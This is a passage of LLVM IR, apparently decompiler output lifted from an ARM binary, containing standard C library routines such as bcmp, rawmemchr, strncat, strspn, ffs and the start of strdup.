  %v2_1a0e4 = load i8, i8* %v1_1a0e4, align 1
  %v2_1a0ec = icmp ugt i8 %v2_1a0e4, -65
  br i1 %v2_1a0ec, label %dec_label_pc_1a10c, label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a0e4
  %v3_1a0fc = call i32 @__stdio_trans2w_o(i8* %v1_1a0e4, i32 128)
  %v2_1a100 = icmp eq i32 %v3_1a0fc, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_1a100, label %dec_label_pc_1a0fc.dec_label_pc_1a10c_crit_edge, label %dec_label_pc_1a120

dec_label_pc_1a0fc.dec_label_pc_1a10c_crit_edge:  ; preds = %dec_label_pc_1a0fc
  %v0_1a114.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a10c

dec_label_pc_1a10c:                               ; preds = %dec_label_pc_1a0fc.dec_label_pc_1a10c_crit_edge, %dec_label_pc_1a0e4
  %v0_1a114 = phi i32 [ %v0_1a114.pre, %dec_label_pc_1a0fc.dec_label_pc_1a10c_crit_edge ], [ %v0_1a0f4, %dec_label_pc_1a0e4 ]
  %v0_1a10c = load i32, i32* @r7, align 4
  %v0_1a110 = load i32, i32* @r6, align 4
  %v3_1a118 = inttoptr i32 %v0_1a10c to i8*
  %v4_1a118 = call i32 @_vfprintf_internal(i32 %v0_1a114, i8* %v3_1a118, i32 %v0_1a110)
  store i32 %v4_1a118, i32* @r5, align 4
  br label %dec_label_pc_1a120

dec_label_pc_1a120:                               ; preds = %dec_label_pc_1a0fc, %dec_label_pc_1a10c
  %v0_1a1385 = phi i32 [ -1, %dec_label_pc_1a0fc ], [ %v4_1a118, %dec_label_pc_1a10c ]
  %v0_1a120 = load i32, i32* @r8, align 4
  %v2_1a120 = icmp eq i32 %v0_1a120, 0
  br i1 %v2_1a120, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a120
  call void @__pseudo_branch(i32 58236)
  %v0_1a138.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a120, %bb
  %v0_1a138 = phi i32 [ %v0_1a1385, %dec_label_pc_1a120 ], [ %v0_1a138.pre, %bb ]
  store i32 %v6_1a098, i32* @r5, align 4
  store i32 %v12_1a098, i32* @r7, align 4
  store i32 %v15_1a098, i32* @r8, align 4
  ret i32 %v0_1a138

; uselistorder directives
  uselistorder i32 58236, { 0, 1, 6, 7, 8, 2, 9, 10, 3, 4, 5, 11, 12 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 13, 12, 41, 24, 23, 22, 21, 20, 19, 18, 11, 1, 17, 52, 51, 39, 5, 2, 16, 15, 4, 3, 9, 8, 7, 6, 30, 29, 28, 32, 31, 10, 27, 14, 26, 25, 35, 34, 33, 50, 49, 53, 48, 47, 0, 46, 45, 44, 43, 42, 40, 38, 37, 36 }
  uselistorder i32 ()* @__pthread_cleanup_push_defer, { 5, 4, 27, 14, 13, 12, 11, 10, 9, 8, 3, 0, 7, 29, 28, 26, 1, 20, 19, 18, 22, 21, 2, 17, 6, 16, 15, 25, 24, 23 }
  uselistorder i32 ptrtoint (i8* @global_var_f360.275 to i32), { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1a120, { 1, 0 }
  uselistorder label %dec_label_pc_1a0e4, { 1, 0 }
}

define i32 @bcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_1a160 = add i32 %arg2, -1
  %v6_1a160 = icmp slt i32 %v1_1a160, 0
  br i1 %v6_1a160, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  %v2_1a16c = add i32 %v1_1a160, %tmp
  %v0_1a174.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a170

dec_label_pc_1a170:                               ; preds = %bb6, %.thread
  %v0_1a174 = phi i32 [ %v0_1a174.pre, %.thread ], [ %v5_1a174, %bb6 ]
  %v0_1a170 = phi i32 [ %tmp, %.thread ], [ %v5_1a170, %bb6 ]
  %v1_1a170 = inttoptr i32 %v0_1a170 to i8*
  %v2_1a170 = load i8, i8* %v1_1a170, align 1
  %v3_1a170 = zext i8 %v2_1a170 to i32
  %v5_1a170 = add i32 %v0_1a170, 1
  %v1_1a174 = inttoptr i32 %v0_1a174 to i8*
  %v2_1a174 = load i8, i8* %v1_1a174, align 1
  %v3_1a174 = zext i8 %v2_1a174 to i32
  %v3_1a178 = icmp ult i32 %v2_1a16c, %v5_1a170
  %v3_1a17c = sub nsw i32 %v3_1a170, %v3_1a174
  br i1 %v3_1a178, label %dec_label_pc_1a184, label %bb6

bb6:                                              ; preds = %dec_label_pc_1a170
  %v5_1a174 = add i32 %v0_1a174, 1
  %v10_1a17c = icmp eq i8 %v2_1a170, %v2_1a174
  br i1 %v10_1a17c, label %dec_label_pc_1a170, label %dec_label_pc_1a184

dec_label_pc_1a184:                               ; preds = %dec_label_pc_1a170, %bb6
  ret i32 %v3_1a17c

; uselistorder directives
  uselistorder i32 %v5_1a170, { 1, 0 }
  uselistorder i32 %v0_1a170, { 1, 0 }
  uselistorder i32 %v0_1a174, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_1a184, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a1b4:
  %v1_1a194 = urem i32 %arg1, 256
  store i32 %v1_1a194, i32* @lr, align 4
  %v4_1a1b4 = mul nuw nsw i32 %v1_1a194, 256
  %v5_1a1b4 = or i32 %v4_1a1b4, %v1_1a194
  %v4_1a1bc = mul i32 %v5_1a1b4, 65536
  %v5_1a1bc = or i32 %v4_1a1bc, %v5_1a1b4
  %v0_1a1c0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1a1c0

dec_label_pc_1a1c0:                               ; preds = %dec_label_pc_1a22c, %dec_label_pc_1a1c0, %dec_label_pc_1a1b4
  %v0_1a1c0 = phi i32 [ %v0_1a1c0.pre, %dec_label_pc_1a1b4 ], [ %v4_1a1c0, %dec_label_pc_1a1c0 ], [ %v4_1a1c0, %dec_label_pc_1a22c ]
  %v1_1a1c0 = inttoptr i32 %v0_1a1c0 to i32*
  %v2_1a1c0 = load i32, i32* %v1_1a1c0, align 4
  %v4_1a1c0 = add i32 %v0_1a1c0, 4
  store i32 %v4_1a1c0, i32* @ip, align 4
  %v2_1a1c8 = xor i32 %v2_1a1c0, %v5_1a1bc
  %v2_1a1cc = add i32 %v2_1a1c8, 2130640639
  %v1_1a1d4 = sub i32 -1, %v2_1a1c8
  %v2_1a1d8 = xor i32 %v2_1a1cc, %v1_1a1d4
  %v2_1a1dc = and i32 %v2_1a1d8, -2130640640
  %v2_1a1e0 = icmp eq i32 %v2_1a1dc, 0
  br i1 %v2_1a1e0, label %dec_label_pc_1a1c0, label %dec_label_pc_1a1e8

dec_label_pc_1a1e8:                               ; preds = %dec_label_pc_1a1c0
  %v2_1a1e8 = inttoptr i32 %v0_1a1c0 to i8*
  %v3_1a1e8 = load i8, i8* %v2_1a1e8, align 1
  %v4_1a1e8 = zext i8 %v3_1a1e8 to i32
  %v9_1a1f0 = icmp eq i32 %v4_1a1e8, %v1_1a194
  store i1 %v9_1a1f0, i1* @cpsr_z, align 1
  %v1_1a1f4 = add i32 %v0_1a1c0, 3
  %v1_1a1f8 = add i32 %v0_1a1c0, 1
  store i32 %v1_1a1f8, i32* @r2, align 4
  %v1_1a1fc = add i32 %v0_1a1c0, 2
  br i1 %v9_1a1f0, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1a1e8
  ret i32 %v0_1a1c0

bb18:                                             ; preds = %dec_label_pc_1a1e8
  %v2_1a204 = inttoptr i32 %v1_1a1f8 to i8*
  %v3_1a204 = load i8, i8* %v2_1a204, align 1
  %v4_1a204 = zext i8 %v3_1a204 to i32
  %v9_1a208 = icmp eq i32 %v4_1a204, %v1_1a194
  store i1 %v9_1a208, i1* @cpsr_z, align 1
  br i1 %v9_1a208, label %dec_label_pc_1a210, label %dec_label_pc_1a218

dec_label_pc_1a210:                               ; preds = %bb18
  ret i32 %v1_1a1f8

dec_label_pc_1a218:                               ; preds = %bb18
  %v2_1a218 = inttoptr i32 %v1_1a1fc to i8*
  %v3_1a218 = load i8, i8* %v2_1a218, align 1
  %v4_1a218 = zext i8 %v3_1a218 to i32
  %v9_1a21c = icmp eq i32 %v4_1a218, %v1_1a194
  store i1 %v9_1a21c, i1* @cpsr_z, align 1
  br i1 %v9_1a21c, label %dec_label_pc_1a224, label %dec_label_pc_1a22c

dec_label_pc_1a224:                               ; preds = %dec_label_pc_1a218
  ret i32 %v1_1a1fc

dec_label_pc_1a22c:                               ; preds = %dec_label_pc_1a218
  %v2_1a22c = inttoptr i32 %v1_1a1f4 to i8*
  %v3_1a22c = load i8, i8* %v2_1a22c, align 1
  %v4_1a22c = zext i8 %v3_1a22c to i32
  %v9_1a230 = icmp eq i32 %v4_1a22c, %v1_1a194
  store i1 %v9_1a230, i1* @cpsr_z, align 1
  br i1 %v9_1a230, label %dec_label_pc_1a238, label %dec_label_pc_1a1c0

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a22c
  ret i32 %v1_1a1f4

; uselistorder directives
  uselistorder i32 %v4_1a1c0, { 2, 1, 0 }
  uselistorder i32 %v0_1a1c0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1a1b4, { 1, 0 }
  uselistorder i32 %v1_1a194, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a248 = load i32, i32* @r4, align 4
  store i32 %v3_1a248, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a254

dec_label_pc_1a254:                               ; preds = %dec_label_pc_1a254, %entry
  %v0_1a254 = phi i32 [ %v5_1a254, %dec_label_pc_1a254 ], [ %tmp, %entry ]
  %v1_1a254 = inttoptr i32 %v0_1a254 to i8*
  %v2_1a254 = load i8, i8* %v1_1a254, align 1
  %v3_1a254 = zext i8 %v2_1a254 to i32
  store i32 %v3_1a254, i32* %ip.global-to-local, align 4
  %v5_1a254 = add i32 %v0_1a254, 1
  store i32 %v5_1a254, i32* %r3.global-to-local, align 4
  %v2_1a258 = icmp eq i8 %v2_1a254, 0
  store i1 %v2_1a258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a258, label %dec_label_pc_1a260, label %dec_label_pc_1a254

dec_label_pc_1a260:                               ; preds = %dec_label_pc_1a254
  %v0_1a260 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a260 = icmp eq i32 %v0_1a260, 3
  store i1 %v7_1a260, i1* %cpsr_z.global-to-local, align 1
  %v1_1a264 = add i32 %v0_1a254, -1
  store i32 %v1_1a264, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_1a260, 4
  br i1 %tmp10, label %dec_label_pc_1a2f8thread-pre-split, label %dec_label_pc_1a26c

dec_label_pc_1a26c:                               ; preds = %dec_label_pc_1a260
  %v3_1a26c = udiv i32 %v0_1a260, 4
  store i32 %v3_1a26c, i32* %r0.global-to-local, align 4
  %v0_1a270.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a270

dec_label_pc_1a270:                               ; preds = %dec_label_pc_1a2d0, %dec_label_pc_1a26c
  %v2_1a278 = phi i32 [ %v1_1a2c8, %dec_label_pc_1a2d0 ], [ %v1_1a264, %dec_label_pc_1a26c ]
  %v0_1a270 = phi i32 [ %v1_1a2c4, %dec_label_pc_1a2d0 ], [ %v0_1a270.pre, %dec_label_pc_1a26c ]
  %v1_1a270 = inttoptr i32 %v0_1a270 to i8*
  %v2_1a270 = load i8, i8* %v1_1a270, align 1
  %v3_1a270 = zext i8 %v2_1a270 to i32
  store i32 %v3_1a270, i32* %r3.global-to-local, align 4
  %v2_1a274 = icmp eq i8 %v2_1a270, 0
  store i1 %v2_1a274, i1* %cpsr_z.global-to-local, align 1
  %v3_1a278 = add i32 %v2_1a278, 1
  %v4_1a278 = inttoptr i32 %v3_1a278 to i8*
  store i8 %v2_1a270, i8* %v4_1a278, align 1
  %v0_1a27c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a27c = add i32 %v0_1a27c, 1
  store i32 %v1_1a27c, i32* %ip.global-to-local, align 4
  %v0_1a280 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a280, label %.loopexit, label %dec_label_pc_1a284

dec_label_pc_1a284:                               ; preds = %dec_label_pc_1a270
  %v0_1a284 = load i32, i32* @r1, align 4
  %v1_1a284 = add i32 %v0_1a284, 1
  %v2_1a284 = inttoptr i32 %v1_1a284 to i8*
  %v3_1a284 = load i8, i8* %v2_1a284, align 1
  %v4_1a284 = zext i8 %v3_1a284 to i32
  store i32 %v4_1a284, i32* %r3.global-to-local, align 4
  %v2_1a288 = icmp eq i8 %v3_1a284, 0
  store i1 %v2_1a288, i1* %cpsr_z.global-to-local, align 1
  %v3_1a28c = add i32 %v0_1a27c, 2
  %v4_1a28c = inttoptr i32 %v3_1a28c to i8*
  store i8 %v3_1a284, i8* %v4_1a28c, align 1
  %v0_1a290 = load i32, i32* @r1, align 4
  %v1_1a290 = add i32 %v0_1a290, 1
  store i32 %v1_1a290, i32* %r1.global-to-local, align 4
  %v0_1a294 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a294 = add i32 %v0_1a294, 1
  store i32 %v1_1a294, i32* %ip.global-to-local, align 4
  %v0_1a298 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a298, label %.loopexit, label %dec_label_pc_1a29c

dec_label_pc_1a29c:                               ; preds = %dec_label_pc_1a284
  %v1_1a29c = add i32 %v0_1a290, 2
  %v2_1a29c = inttoptr i32 %v1_1a29c to i8*
  %v3_1a29c = load i8, i8* %v2_1a29c, align 1
  %v4_1a29c = zext i8 %v3_1a29c to i32
  store i32 %v4_1a29c, i32* %r3.global-to-local, align 4
  %v2_1a2a0 = icmp eq i8 %v3_1a29c, 0
  store i1 %v2_1a2a0, i1* %cpsr_z.global-to-local, align 1
  %v3_1a2a4 = add i32 %v0_1a294, 2
  %v4_1a2a4 = inttoptr i32 %v3_1a2a4 to i8*
  store i8 %v3_1a29c, i8* %v4_1a2a4, align 1
  %v0_1a2a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2a8 = add i32 %v0_1a2a8, 1
  store i32 %v1_1a2a8, i32* %r1.global-to-local, align 4
  %v0_1a2ac = load i32, i32* %ip.global-to-local, align 4
  %v1_1a2ac = add i32 %v0_1a2ac, 1
  store i32 %v1_1a2ac, i32* %lr.global-to-local, align 4
  %v0_1a2b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2b0, label %.loopexit, label %dec_label_pc_1a2b4

dec_label_pc_1a2b4:                               ; preds = %dec_label_pc_1a29c
  %v1_1a2b4 = add i32 %v0_1a2a8, 2
  %v2_1a2b4 = inttoptr i32 %v1_1a2b4 to i8*
  %v3_1a2b4 = load i8, i8* %v2_1a2b4, align 1
  %v4_1a2b4 = zext i8 %v3_1a2b4 to i32
  store i32 %v4_1a2b4, i32* %ip.global-to-local, align 4
  store i32 %v1_1a2b4, i32* %r3.global-to-local, align 4
  %v2_1a2bc = icmp eq i8 %v3_1a2b4, 0
  store i1 %v2_1a2bc, i1* %cpsr_z.global-to-local, align 1
  %v3_1a2c0 = add i32 %v0_1a2ac, 2
  %v4_1a2c0 = inttoptr i32 %v3_1a2c0 to i8*
  store i8 %v3_1a2b4, i8* %v4_1a2c0, align 1
  %v0_1a2c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a2c4 = add i32 %v0_1a2c4, 1
  store i32 %v1_1a2c4, i32* @r1, align 4
  %v0_1a2c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a2c8 = add i32 %v0_1a2c8, 1
  store i32 %v1_1a2c8, i32* %lr.global-to-local, align 4
  %v0_1a2cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2cc, label %.loopexit, label %dec_label_pc_1a2d0

dec_label_pc_1a2d0:                               ; preds = %dec_label_pc_1a2b4
  %v0_1a2d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a2d0 = add i32 %v0_1a2d0, -1
  store i32 %v1_1a2d0, i32* %r0.global-to-local, align 4
  %v7_1a2d0 = icmp eq i32 %v0_1a2d0, 1
  store i1 %v7_1a2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2d0, label %dec_label_pc_1a2d8, label %dec_label_pc_1a270

dec_label_pc_1a2d8:                               ; preds = %dec_label_pc_1a2d0
  %v0_1a2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a2d8 = urem i32 %v0_1a2d8, 4
  store i32 %v1_1a2d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2f8

dec_label_pc_1a2e0:                               ; preds = %dec_label_pc_1a2f8
  %v0_1a2e0 = load i32, i32* @r1, align 4
  %v1_1a2e0 = inttoptr i32 %v0_1a2e0 to i8*
  %v2_1a2e0 = load i8, i8* %v1_1a2e0, align 1
  %v3_1a2e0 = zext i8 %v2_1a2e0 to i32
  store i32 %v3_1a2e0, i32* %ip.global-to-local, align 4
  %v2_1a2e4 = icmp eq i8 %v2_1a2e0, 0
  store i1 %v2_1a2e4, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2e8 = add i32 %v1_1a304, -1
  store i32 %v1_1a2e8, i32* %r2.global-to-local, align 4
  %v3_1a2ec = add i32 %v3_1a304, 1
  %v4_1a2ec = inttoptr i32 %v3_1a2ec to i8*
  store i8 %v2_1a2e0, i8* %v4_1a2ec, align 1
  %v5_1a2ec = load i32, i32* %lr.global-to-local, align 4
  %v6_1a2ec = add i32 %v5_1a2ec, 1
  store i32 %v6_1a2ec, i32* %lr.global-to-local, align 4
  %v0_1a2f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2f0, label %.loopexit, label %dec_label_pc_1a2f4

dec_label_pc_1a2f4:                               ; preds = %dec_label_pc_1a2e0
  %v0_1a2f4 = load i32, i32* @r1, align 4
  %v1_1a2f4 = add i32 %v0_1a2f4, 1
  store i32 %v1_1a2f4, i32* @r1, align 4
  %v0_1a2f8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2f8thread-pre-split

dec_label_pc_1a2f8thread-pre-split:               ; preds = %dec_label_pc_1a2f4, %dec_label_pc_1a260
  %v2_1a2ec6 = phi i32 [ %v6_1a2ec, %dec_label_pc_1a2f4 ], [ %v1_1a264, %dec_label_pc_1a260 ]
  %v0_1a2f8.pr = phi i32 [ %v0_1a2f8.pr.pre, %dec_label_pc_1a2f4 ], [ %v0_1a260, %dec_label_pc_1a260 ]
  br label %dec_label_pc_1a2f8

dec_label_pc_1a2f8:                               ; preds = %dec_label_pc_1a2f8thread-pre-split, %dec_label_pc_1a2d8
  %v3_1a304 = phi i32 [ %v2_1a2ec6, %dec_label_pc_1a2f8thread-pre-split ], [ %v1_1a2c8, %dec_label_pc_1a2d8 ]
  %v1_1a304 = phi i32 [ %v0_1a2f8.pr, %dec_label_pc_1a2f8thread-pre-split ], [ %v1_1a2d8, %dec_label_pc_1a2d8 ]
  %v2_1a2f8 = icmp eq i32 %v1_1a304, 0
  store i1 %v2_1a2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2f8, label %dec_label_pc_1a300, label %dec_label_pc_1a2e0

dec_label_pc_1a300:                               ; preds = %dec_label_pc_1a2f8
  %v0_1a300 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a300 = icmp eq i32 %v0_1a300, 0
  store i1 %v2_1a300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a300, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_1a300
  %v4_1a304 = add i32 %v3_1a304, 1
  %v5_1a304 = inttoptr i32 %v4_1a304 to i8*
  store i8 0, i8* %v5_1a304, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1a2b4, %dec_label_pc_1a29c, %dec_label_pc_1a284, %dec_label_pc_1a270, %dec_label_pc_1a2e0, %dec_label_pc_1a300, %bb
  %v0_1a308 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a308, i32* %r0.global-to-local, align 4
  %v2_1a30c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a30c, i32* @r4, align 4
  ret i32 %v0_1a308

; uselistorder directives
  uselistorder i32 %v1_1a304, { 1, 0 }
  uselistorder i32 %v1_1a2d8, { 1, 0 }
  uselistorder i32 %v0_1a2d0, { 1, 0 }
  uselistorder i32 %v1_1a2c8, { 0, 2, 1 }
  uselistorder i32 %v1_1a2c4, { 1, 0 }
  uselistorder i32 %v0_1a260, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1a254, { 1, 0 }
  uselistorder i32 %v0_1a254, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_1a3482 = load i32, i32* @r0, align 4
  %v1_1a3483 = inttoptr i32 %v0_1a3482 to i8*
  %v2_1a3484 = load i8, i8* %v1_1a3483, align 1
  %v3_1a3485 = zext i8 %v2_1a3484 to i32
  store i32 %v3_1a3485, i32* @r2, align 4
  %v2_1a34c6 = icmp eq i8 %v2_1a3484, 0
  br i1 %v2_1a34c6, label %dec_label_pc_1a358, label %dec_label_pc_1a324.preheader

dec_label_pc_1a31c:                               ; preds = %dec_label_pc_1a324
  %v1_1a32c = add i32 %v0_1a32c, 1
  %v9_1a31c = icmp eq i32 %v0_1a338, %v3_1a324
  br i1 %v9_1a31c, label %dec_label_pc_1a338, label %dec_label_pc_1a324

dec_label_pc_1a324:                               ; preds = %dec_label_pc_1a324.preheader, %dec_label_pc_1a31c
  %v0_1a32c = phi i32 [ %tmp, %dec_label_pc_1a324.preheader ], [ %v1_1a32c, %dec_label_pc_1a31c ]
  %v1_1a324 = inttoptr i32 %v0_1a32c to i8*
  %v2_1a324 = load i8, i8* %v1_1a324, align 1
  %v3_1a324 = zext i8 %v2_1a324 to i32
  store i32 %v3_1a324, i32* @ip, align 4
  %v2_1a328 = icmp eq i8 %v2_1a324, 0
  br i1 %v2_1a328, label %dec_label_pc_1a358, label %dec_label_pc_1a31c

dec_label_pc_1a338:                               ; preds = %dec_label_pc_1a31c
  %v2_1a338 = icmp eq i32 %v0_1a338, 0
  br i1 %v2_1a338, label %dec_label_pc_1a358, label %dec_label_pc_1a340

dec_label_pc_1a340:                               ; preds = %dec_label_pc_1a338
  %v1_1a340 = add i32 %v0_1a340, 1
  store i32 %v1_1a340, i32* @lr, align 4
  %v1_1a344 = add i32 %v0_1a344, 1
  %v1_1a348 = inttoptr i32 %v1_1a344 to i8*
  %v2_1a348 = load i8, i8* %v1_1a348, align 1
  %v3_1a348 = zext i8 %v2_1a348 to i32
  store i32 %v3_1a348, i32* @r2, align 4
  %v2_1a34c = icmp eq i8 %v2_1a348, 0
  br i1 %v2_1a34c, label %dec_label_pc_1a358, label %dec_label_pc_1a324.preheader

dec_label_pc_1a324.preheader:                     ; preds = %entry, %dec_label_pc_1a340
  %v0_1a344 = phi i32 [ %v1_1a344, %dec_label_pc_1a340 ], [ %v0_1a3482, %entry ]
  %v0_1a340 = phi i32 [ %v1_1a340, %dec_label_pc_1a340 ], [ 0, %entry ]
  %v0_1a338 = phi i32 [ %v3_1a348, %dec_label_pc_1a340 ], [ %v3_1a3485, %entry ]
  br label %dec_label_pc_1a324

dec_label_pc_1a358:                               ; preds = %dec_label_pc_1a338, %dec_label_pc_1a340, %dec_label_pc_1a324, %entry
  %v0_1a358 = phi i32 [ 0, %entry ], [ %v0_1a340, %dec_label_pc_1a324 ], [ %v1_1a340, %dec_label_pc_1a340 ], [ %v0_1a340, %dec_label_pc_1a338 ]
  ret i32 %v0_1a358

; uselistorder directives
  uselistorder i32 %v3_1a324, { 1, 0 }
  uselistorder i32 %v0_1a32c, { 1, 0 }
  uselistorder label %dec_label_pc_1a358, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a324.preheader, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1a364 = urem i32 %arg1, 65536
  %v2_1a368 = icmp eq i32 %v3_1a364, 0
  br i1 %v2_1a368, label %.thread1, label %bb21

.thread1:                                         ; preds = %entry
  %v4_1a36c = sdiv i32 %arg1, 65536
  br label %bb21

bb21:                                             ; preds = %entry, %.thread1
  %v1_1a380 = phi i32 [ %v4_1a36c, %.thread1 ], [ %arg1, %entry ]
  %storemerge = phi i32 [ 17, %.thread1 ], [ 1, %entry ]
  %v1_1a378 = urem i32 %v1_1a380, 256
  %v2_1a378 = icmp eq i32 %v1_1a378, 0
  br i1 %v2_1a378, label %bb22, label %.thread3

bb22:                                             ; preds = %bb21
  %v2_1a37c = or i32 %storemerge, 8
  %v4_1a380 = sdiv i32 %v1_1a380, 256
  br label %.thread3

.thread3:                                         ; preds = %bb21, %bb22
  %v1_1a38c = phi i32 [ %storemerge, %bb21 ], [ %v2_1a37c, %bb22 ]
  %v1_1a390 = phi i32 [ %v1_1a380, %bb21 ], [ %v4_1a380, %bb22 ]
  %v1_1a388 = urem i32 %v1_1a390, 16
  %v2_1a388 = icmp eq i32 %v1_1a388, 0
  br i1 %v2_1a388, label %bb23, label %.thread5

bb23:                                             ; preds = %.thread3
  %v2_1a38c = add nsw i32 %v1_1a38c, 4
  %v4_1a390 = sdiv i32 %v1_1a390, 16
  %v2_1a394 = urem i32 %v2_1a38c, 256
  br label %.thread5

.thread5:                                         ; preds = %.thread3, %bb23
  %v1_1a39c = phi i32 [ %v1_1a38c, %.thread3 ], [ %v2_1a394, %bb23 ]
  %v1_1a3a0 = phi i32 [ %v1_1a390, %.thread3 ], [ %v4_1a390, %bb23 ]
  %v1_1a398 = urem i32 %v1_1a3a0, 4
  %v2_1a398 = icmp eq i32 %v1_1a398, 0
  br i1 %v2_1a398, label %bb24, label %.thread7

bb24:                                             ; preds = %.thread5
  %v2_1a39c = add nsw i32 %v1_1a39c, 2
  %v4_1a3a0 = sdiv i32 %v1_1a3a0, 4
  %v2_1a3a4 = urem i32 %v2_1a39c, 256
  br label %.thread7

.thread7:                                         ; preds = %bb24, %.thread5
  %v1_1a3b419 = phi i32 [ %v1_1a39c, %.thread5 ], [ %v2_1a3a4, %bb24 ]
  %v0_1a3a8.pr = phi i32 [ %v1_1a3a0, %.thread5 ], [ %v4_1a3a0, %bb24 ]
  %v2_1a3a8 = icmp eq i32 %v0_1a3a8.pr, 0
  br i1 %v2_1a3a8, label %.thread9, label %bb25

bb25:                                             ; preds = %.thread7
  %v2_1a3ac = urem i32 %v0_1a3a8.pr, 2
  %v2_1a3b0 = xor i32 %v2_1a3ac, 1
  %v3_1a3b4 = add nsw i32 %v2_1a3b0, %v1_1a3b419
  br label %.thread9

.thread9:                                         ; preds = %.thread7, %bb25
  %v1_1a3b8 = phi i32 [ 0, %.thread7 ], [ %v3_1a3b4, %bb25 ]
  ret i32 %v1_1a3b8

; uselistorder directives
  uselistorder i32 %v1_1a3a0, { 2, 0, 1 }
  uselistorder i32 %v1_1a390, { 2, 0, 1 }
  uselistorder i32 %v1_1a380, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_1a3bc = load i32, i32* @r4, align 4
  store i32 %v3_1a3bc, i32* %stack_var_-12, align 4
  %v6_1a3bc = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_1a3c4 = call i32 @strlen(i8* %arg1)
